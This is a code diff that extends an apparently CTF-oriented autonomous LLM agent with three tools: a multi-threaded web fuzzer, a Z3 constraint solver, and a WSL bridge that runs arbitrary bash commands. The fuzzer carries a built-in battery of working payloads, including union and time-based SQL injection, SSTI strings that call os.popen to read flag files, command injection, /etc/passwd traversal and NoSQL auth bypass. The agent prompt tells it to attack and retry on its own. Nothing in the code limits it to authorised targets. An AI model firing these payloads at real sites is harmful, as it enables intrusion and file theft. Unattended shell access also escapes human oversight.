@@ -383,6 +383,87 @@ OPENAI_TOOLS = [
                 "required": ["scripts"]
             }
         }
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "web_dynamic_fuzzer",
+            "description": "High-speed Dynamic Web Fuzzing Engine. Uses ZeroGPU Vector RAG and DNA Knowledge Graph to retrieve domain payloads (SQLi, SSTI, Command Injection, Traversal, AuthBypass), executes multi-threaded differential testing (timing, length, error reflection), and auto-captures flags.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "target_url": {
+                        "type": "string",
+                        "description": "Target endpoint URL (e.g. 'http://ctf.target/search?q=FUZZ' or 'http://ctf.target/login')"
+                    },
+                    "category": {
+                        "type": "string",
+                        "enum": ["SQLi", "SSTI", "CommandInjection", "PathTraversal", "AuthBypass", "IDOR"],
+                        "description": "Attack category to fuzz"
+                    },
+                    "method": {
+                        "type": "string",
+                        "enum": ["GET", "POST"],
+                        "description": "HTTP method (default: GET)"
+                    },
+                    "param_name": {
+                        "type": "string",
+                        "description": "Target parameter name to inject (e.g. 'id', 'name', 'query')"
+                    },
+                    "data": {
+                        "type": "object",
+                        "description": "Optional form body or JSON dictionary for POST requests"
+                    }
+                },
+                "required": ["target_url", "category"]
+            }
+        }
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "symbolic_execution_solver",
+            "description": "Symbolic Execution & Path Constraint Solver using Z3 SMT engine. Solves branch conditions, byte-level crackme constraints (XOR, modular math, bitwise ops), and extracts input strings that trigger the target path.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "constraints": {
+                        "type": "string",
+                        "description": "Python or Z3 constraint block or equations to solve (e.g. '(flag[0] ^ 0x42) + flag[1] == 1337')"
+                    },
+                    "target_var": {
+                        "type": "string",
+                        "description": "Name of the variable or array to solve for (e.g. 'flag' or 'key')"
+                    },
+                    "length": {
+                        "type": "integer",
+                        "description": "Length in bytes if solving for a string/byte array (e.g. 16 or 32)"
+                    }
+                },
+                "required": ["constraints"]
+            }
+        }
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "wsl_linux_bridge",
+            "description": "Executes Linux terminal commands, ELF binary analysis (checksec, readelf, strings), and Linux exploit scripts via WSL2 Linux Subsystem.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "command": {
+                        "type": "string",
+                        "description": "Linux command to execute inside WSL (e.g. 'checksec --file=./vuln' or 'python3 exploit.py')"
+                    },
+                    "timeout_seconds": {
+                        "type": "integer",
+                        "description": "Timeout in seconds (default: 15)"
+                    }
+                },
+                "required": ["command"]
+            }
+        }
     }
 ]
 
@@ -1003,6 +1084,390 @@ def execute_tool(tool_name: str, tool_input: dict) -> str:
         except Exception as e:
             return json.dumps({"error": f"Socket connection to {host}:{port} failed: {str(e)}"})
 
+    # 12. DYNAMIC WEB FUZZING ENGINE (Vector RAG + DNA Graph + Differential Analysis)
+    elif tool_name == "web_dynamic_fuzzer":
+        target_url = tool_input.get("target_url", "").strip()
+        category = tool_input.get("category", "SQLi")
+        method = tool_input.get("method", "GET").upper()
+        param_name = tool_input.get("param_name", "")
+        post_data = tool_input.get("data") or {}
+
+        if not target_url:
+            return json.dumps({"error": "target_url is required"})
+
+        # Built-in high-potency CTF payload battery per category
+        BATTERY = {
+            "SQLi": [
+                "' OR '1'='1",
+                "' OR 1=1-- -",
+                "admin'--",
+                "1' UNION SELECT null,version(),null-- -",
+                "1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -",
+                "1' UNION SELECT 1,flag,3 FROM flags-- -",
+                "' OR sleep(2.5)-- -",
+                "1; SELECT pg_sleep(2.5)--",
+                "' AND (SELECT 1 FROM (SELECT(SLEEP(2.5)))a)--"
+            ],
+            "SSTI": [
+                "{{7*7}}",
+                "${7*7}",
+                "<%= 7*7 %>",
+                "{{config}}",
+                "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag* /flag flag.txt').read()}}",
+                "{{request.application.__globals__.__builtins__.__import__('os').popen('id; cat flag*').read()}}",
+                "*{7*7}",
+                "{{''.__class__.__mro__[1].__subclasses__()}}"
+            ],
+            "CommandInjection": [
+                "; cat flag* /flag /flag.txt",
+                "| cat flag* /flag",
+                "$(cat flag*)",
+                "; whoami",
+                "| id",
+                "& dir flag*",
+                "; sleep 2.5",
+                "`cat flag*`"
+            ],
+            "PathTraversal": [
+                "../../../../etc/passwd",
+                "....//....//....//etc/passwd",
+                "../../../../flag.txt",
+                "../../../../flag",
+                "..%2f..%2f..%2fflag.txt",
+                "/etc/passwd",
+                "/flag"
+            ],
+            "AuthBypass": [
+                "admin' OR '1'='1",
+                "admin'--",
+                "admin' or 1=1#",
+                "{\"username\": \"admin\", \"password\": {\"$ne\": null}}",
+                "' OR 1=1 LIMIT 1--"
+            ],
+            "IDOR": [
+                "0",
+                "1",
+                "admin",
+                "-1",
+                "9999",
+                "1000",
+                "true"
+            ]
+        }
+
+        payloads = list(BATTERY.get(category, BATTERY["SQLi"]))
+
+        # Query Hugging Face ZeroGPU Vector Space for additional discovered CTF payloads
+        try:
+            rag_res = requests.post(
+                f"{HF_VECTOR_URL}/gradio_api/call/query",
+                json={"data": [f"{category} web exploitation payload bypass CTF", "Web", 2]},
+                timeout=5
+            )
+            if rag_res.status_code == 200:
+                ev_id = rag_res.json().get("event_id")
+                if ev_id:
+                    v_res = requests.get(f"{HF_VECTOR_URL}/gradio_api/call/query/{ev_id}", timeout=5)
+                    for ln in v_res.text.split("\n"):
+                        if ln.startswith("data:"):
+                            rag_text = json.loads(ln[5:].strip())[0]
+                            extracted = re.findall(r"`([^`]{2,80})`", rag_text)
+                            for exp in extracted:
+                                if exp not in payloads and len(exp) < 100:
+                                    payloads.append(exp)
+        except Exception:
+            pass
+
+        # Query DNA Knowledge Graph for category attack patterns
+        try:
+            dna_res = requests.post(
+                f"{HF_URL}/search/essence",
+                json={"text": f"{category} attack vector", "top_k": 2},
+                timeout=4
+            )
+            if dna_res.status_code == 200:
+                dna_text = dna_res.text
+                d_extracted = re.findall(r"`([^`]{2,80})`", dna_text)
+                for exp in d_extracted:
+                    if exp not in payloads and len(exp) < 100:
+                        payloads.append(exp)
+        except Exception:
+            pass
+
+        payloads = payloads[:15]
+
+        # Differential Baseline Measurement
+        session = requests.Session()
+        session.headers.update({"User-Agent": "CTF-Dynamic-Fuzzer/2.0 (Security-Audit)"})
+
+        baseline_len = 0
+        baseline_time = 0.0
+        baseline_status = 200
+        baseline_body = ""
+        try:
+            t0 = time.time()
+            if method == "POST":
+                base_resp = session.post(target_url, json=post_data if post_data else None, timeout=5)
+            else:
+                base_resp = session.get(target_url, timeout=5)
+            baseline_time = round(time.time() - t0, 3)
+            baseline_len = len(base_resp.text)
+            baseline_status = base_resp.status_code
+            baseline_body = base_resp.text
+        except Exception as e:
+            return json.dumps({"error": f"Failed to connect to baseline target {target_url}: {str(e)}"})
+
+        def find_flags(txt):
+            return re.findall(r"(?:HQX|flag|CTF|hackquest|picoCTF)\{[^}]+\}", txt, re.IGNORECASE)
+
+        captured_flags = list(set(find_flags(baseline_body)))
+        if captured_flags:
+            return json.dumps({
+                "status": "flag_captured_in_baseline",
+                "winning_flags": captured_flags,
+                "url": target_url
+            }, indent=2)
+
+        findings = []
+        import concurrent.futures
+
+        def _test_payload(pld):
+            try:
+                cur_url = target_url
+                cur_data = dict(post_data) if post_data else {}
+                cur_params = {}
+
+                if "FUZZ" in cur_url:
+                    cur_url = cur_url.replace("FUZZ", requests.utils.quote(str(pld)))
+                elif param_name:
+                    if method == "POST":
+                        cur_data[param_name] = pld
+                    else:
+                        cur_params[param_name] = pld
+                else:
+                    sep = "&" if "?" in cur_url else "?"
+                    cur_url = f"{cur_url}{sep}fuzz={requests.utils.quote(str(pld))}"
+
+                t_start = time.time()
+                if method == "POST":
+                    r = session.post(cur_url, data=cur_data if cur_data else None, params=cur_params, timeout=7)
+                else:
+                    r = session.get(cur_url, params=cur_params, timeout=7)
+                duration = round(time.time() - t_start, 3)
+                resp_text = r.text
+
+                flg = find_flags(resp_text)
+                anomalies = []
+
+                if flg:
+                    anomalies.append(f"FLAG_CAPTURE: {flg}")
+
+                if ("7*7" in str(pld)) and ("49" in resp_text) and ("49" not in baseline_body):
+                    anomalies.append("SSTI_CODE_EXECUTION: Expression 7*7 evaluated to 49")
+
+                sql_errs = ["sql syntax", "mysql_fetch", "ora-", "sqlite3.operationalerror", "postgresql", "syntax error at or near"]
+                for serr in sql_errs:
+                    if serr in resp_text.lower() and serr not in baseline_body.lower():
+                        anomalies.append(f"SQL_SYNTAX_ERROR: Leaked database error '{serr}'")
+                        break
+
+                cmd_indicators = ["uid=", "root:", "Volume Serial", "total 0", "drwxr-"]
+                for cind in cmd_indicators:
+                    if cind in resp_text and cind not in baseline_body:
+                        anomalies.append(f"CMD_OUTPUT_REFLECTED: System indicator '{cind}' discovered")
+                        break
+
+                if "root:x:0:0:" in resp_text:
+                    anomalies.append("TRAVERSAL_CONFIRMED: /etc/passwd contents leaked")
+
+                if ("sleep" in str(pld).lower() or "pg_sleep" in str(pld).lower()) and (duration - baseline_time > 2.0):
+                    anomalies.append(f"TIME_DELAY_ANOMALY: Response delayed by {duration}s (baseline {baseline_time}s)")
+
+                len_delta = abs(len(resp_text) - baseline_len)
+                if len_delta > (baseline_len * 0.35 + 50) and r.status_code == 200:
+                    anomalies.append(f"DIFFERENTIAL_LENGTH: Delta of {len_delta} bytes from baseline")
+
+                if anomalies or flg:
+                    return {
+                        "payload": pld,
+                        "status_code": r.status_code,
+                        "duration_s": duration,
+                        "length": len(resp_text),
+                        "anomalies": anomalies,
+                        "flags": flg,
+                        "snippet": resp_text[:300].replace("\n", " ").strip()
+                    }
+            except requests.Timeout:
+                if "sleep" in str(pld).lower():
+                    return {
+                        "payload": pld,
+                        "status_code": 0,
+                        "duration_s": 7.0,
+                        "anomalies": ["BLIND_TIME_EXECUTION: Request timed out on sleep payload"],
+                        "flags": []
+                    }
+            except Exception:
+                pass
+            return None
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as pool:
+            futs = [pool.submit(_test_payload, p) for p in payloads]
+            for fut in concurrent.futures.as_completed(futs):
+                res = fut.result()
+                if res:
+                    findings.append(res)
+                    if res.get("flags"):
+                        captured_flags.extend(res["flags"])
+
+        if findings or captured_flags:
+            try:
+                evidence_text = f"Target {target_url} fuzzed for {category}. Discovered: {[f['anomalies'] for f in findings]} Flags: {captured_flags}"
+                requests.post(
+                    f"{HF_URL}/sync",
+                    json={"text": evidence_text, "source": "DynamicWebFuzzer"},
+                    timeout=3
+                )
+            except Exception:
+                pass
+
+        return json.dumps({
+            "status": "completed",
+            "target": target_url,
+            "category": category,
+            "total_payloads_fuzzed": len(payloads),
+            "winning_flags": list(set(captured_flags)),
+            "vulnerabilities_detected": len(findings),
+            "findings": findings
+        }, indent=2)
+
+    # 13. SYMBOLIC EXECUTION & CONSTRAINT SOLVER (Z3 SMT ENGINE)
+    elif tool_name == "symbolic_execution_solver":
+        constraints_code = tool_input.get("constraints", "").strip()
+        target_var = tool_input.get("target_var", "flag").strip()
+        length = tool_input.get("length")
+
+        if not constraints_code:
+            return json.dumps({"error": "constraints parameter is required"})
+
+        script_parts = [
+            "import sys, os",
+            "from z3 import *",
+            ""
+        ]
+
+        if "Solver()" in constraints_code or "s.check()" in constraints_code:
+            runner_code = constraints_code
+        else:
+            script_parts.append("s = Solver()")
+            if length and int(length) > 0:
+                script_parts.append(f"{target_var} = [BitVec(f'{target_var}_{{i}}', 8) for i in range({length})]")
+                script_parts.append(f"for c in {target_var}: s.add(c >= 0x20, c <= 0x7e)")
+
+            eq_lines = [ln.strip() for ln in constraints_code.replace(";", "\n").split("\n") if ln.strip()]
+            for eq in eq_lines:
+                if eq.startswith("s.add("):
+                    script_parts.append(eq)
+                else:
+                    script_parts.append(f"s.add({eq})")
+
+            script_parts.append("if s.check() == sat:")
+            script_parts.append("    m = s.model()")
+            if length and int(length) > 0:
+                script_parts.append(f"    flag_chars = [chr(m[{target_var}[i]].as_long()) if m[{target_var}[i]] is not None else '?' for i in range({length})]")
+                script_parts.append("    print('SOLVED_STRING:' + ''.join(flag_chars))")
+            script_parts.append("    print('MODEL:' + str(m))")
+            script_parts.append("else:")
+            script_parts.append("    print('UNSAT')")
+            runner_code = "\n".join(script_parts)
+
+        with tempfile.NamedTemporaryFile("w", suffix="_z3_solver.py", delete=False, encoding="utf-8") as sf:
+            sf.write(runner_code)
+            s_name = sf.name
+
+        try:
+            t0 = time.time()
+            proc = subprocess.run([sys.executable, s_name], capture_output=True, text=True, timeout=12)
+            elapsed = round(time.time() - t0, 3)
+            out = proc.stdout
+            err = proc.stderr
+            combined = out + "\n" + err
+
+            flags = re.findall(r"(?:HQX|flag|CTF|hackquest)\{[^}]+\}", combined, re.IGNORECASE)
+            solved_str = ""
+            for line in out.split("\n"):
+                if line.startswith("SOLVED_STRING:"):
+                    solved_str = line.replace("SOLVED_STRING:", "").strip()
+
+            status = "sat" if "SOLVED_STRING:" in out or "sat" in out.lower() or (proc.returncode == 0 and "unsat" not in out.lower()) else "unsat"
+            if proc.returncode != 0:
+                status = "error"
+
+            return json.dumps({
+                "status": status,
+                "elapsed_seconds": elapsed,
+                "solved_string": solved_str,
+                "winning_flags": list(set(flags)),
+                "raw_output": out[:2000],
+                "error": err[:1000] if err else None
+            }, indent=2)
+        except subprocess.TimeoutExpired:
+            return json.dumps({"status": "timeout", "error": "Z3 solver timed out after 12 seconds."})
+        except Exception as e:
+            return json.dumps({"status": "error", "error": str(e)})
+        finally:
+            try:
+                os.remove(s_name)
+            except Exception:
+                pass
+
+    # 14. WSL2 LINUX BRIDGE (ELF Analysis, checksec, gdb-pwndbg, Linux Shell)
+    elif tool_name == "wsl_linux_bridge":
+        cmd = tool_input.get("command", "").strip()
+        timeout = min(int(tool_input.get("timeout_seconds", 15)), 30)
+
+        if not cmd:
+            return json.dumps({"error": "command is required"})
+
+        try:
+            check_proc = subprocess.run(["wsl.exe", "-l", "-q"], capture_output=True, text=True, timeout=4)
+            distros = [d.strip().replace("\x00", "") for d in check_proc.stdout.split("\n") if d.strip()]
+
+            if not distros or check_proc.returncode != 0:
+                return json.dumps({
+                    "status": "wsl_distro_not_installed",
+                    "message": "WSL is installed on Windows, but no Linux distribution (e.g. Ubuntu) is registered.",
+                    "fix_command": "Run 'wsl --install -d Ubuntu' in Windows PowerShell or Terminal.",
+                    "command_requested": cmd
+                }, indent=2)
+
+            t0 = time.time()
+            wsl_proc = subprocess.run(
+                ["wsl.exe", "--", "bash", "-c", cmd],
+                capture_output=True,
+                text=True,
+                timeout=timeout
+            )
+            elapsed = round(time.time() - t0, 3)
+            out = wsl_proc.stdout
+            err = wsl_proc.stderr
+            combined = out + "\n" + err
+
+            flags = re.findall(r"(?:HQX|flag|CTF|hackquest)\{[^}]+\}", combined, re.IGNORECASE)
+
+            return json.dumps({
+                "status": "success" if wsl_proc.returncode == 0 else "error",
+                "returncode": wsl_proc.returncode,
+                "elapsed_seconds": elapsed,
+                "distro": distros[0],
+                "stdout": out[-3000:] if len(out) > 3000 else out,
+                "stderr": err[-1500:] if len(err) > 1500 else err,
+                "winning_flags": list(set(flags))
+            }, indent=2)
+        except subprocess.TimeoutExpired:
+            return json.dumps({"status": "timeout", "error": f"WSL execution timed out after {timeout} seconds"})
+        except Exception as e:
+            return json.dumps({"status": "error", "error": f"WSL bridge error: {str(e)}"})
+
     return json.dumps({"error": f"Unknown tool: {tool_name}"})
 
 # =========================================================================
@@ -1017,13 +1482,14 @@ class CTFOrchestratorAgent:
             "When given a challenge: "
             "1. Determine its domain: Web Application Security, Cryptography, Reverse Engineering & Binary, or Forensics & Log Analysis. "
             "2. Query your Hugging Face ZeroGPU Vector Knowledge Base or DNA Knowledge Graph for patterns. "
-            "3. Use your specialized tools (CyberChef decoder, Binary Strings & Decompiler inspector, Web probe, Forensic Engine, Netcat Socket probe, CTFd manager, parallel_exploit_worker). "
+            "3. Use your specialized tools (web_dynamic_fuzzer, symbolic_execution_solver, wsl_linux_bridge, CyberChef decoder, Binary Strings & Decompiler inspector, Web probe, Forensic Engine, Netcat Socket probe, CTFd manager, parallel_exploit_worker). "
             "4. Verify your exploits autonomously using execute_python_sandbox before returning your answer! You can use z3 (from z3 import *), pycryptodome, sympy, and randcrack directly! "
-            "5. If a script fails or captures no flag, reflect on the error traceback, modify your payload/technique, and RETRY autonomously. "
-            "6. For complex challenges with multiple attack branches or parameter searches, use parallel_exploit_worker to test all variations concurrently! "
-            "7. If you find a new attack relationship, register it with sync_dna_attack_tree. "
-            "8. Remember all past clues, keys, and findings across conversational session turns. "
-            "9. Output clean, runnable exploit code and the extracted flag (format: HQX{...}, flag{...}, or CTF{...})."
+            "5. If solving crackmes or reverse engineering constraint equations, use symbolic_execution_solver (Z3). "
+            "6. For web targets, use web_dynamic_fuzzer to perform intelligent differential payload fuzzing (SQLi, SSTI, Command Injection, Traversal) backed by Vector RAG payloads. "
+            "7. For Linux binary exploitation or ELF analysis, use wsl_linux_bridge. "
+            "8. For complex challenges with multiple attack branches or parameter searches, use parallel_exploit_worker to test all variations concurrently! "
+            "9. If you find a new attack relationship, register it with sync_dna_attack_tree. "
+            "10. Output clean, runnable exploit code and the extracted flag (format: HQX{...}, flag{...}, or CTF{...})."
         )
 
         if self.provider == "groq":
